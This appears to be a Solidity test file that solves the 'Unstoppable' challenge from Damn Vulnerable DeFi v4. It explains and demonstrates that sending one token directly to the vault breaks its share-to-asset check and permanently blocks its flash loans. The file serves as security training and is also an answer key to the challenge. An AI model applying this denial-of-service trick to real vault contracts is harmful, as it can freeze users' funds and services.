// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {UnstoppableChallenge} from "./unstoppable/Unstoppable.t.sol";

/// Known solution to DVD v4 "Unstoppable". The vault's flash loan requires
/// convertToShares(totalSupply) == totalAssets(). A direct token transfer (not via
/// deposit) raises totalAssets() without minting shares, so every later flash loan
/// reverts and the monitor pauses the vault. DVD's own _isSolved() checks this.
contract BountyPoC is UnstoppableChallenge {
    function test_bounty_solution() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
}
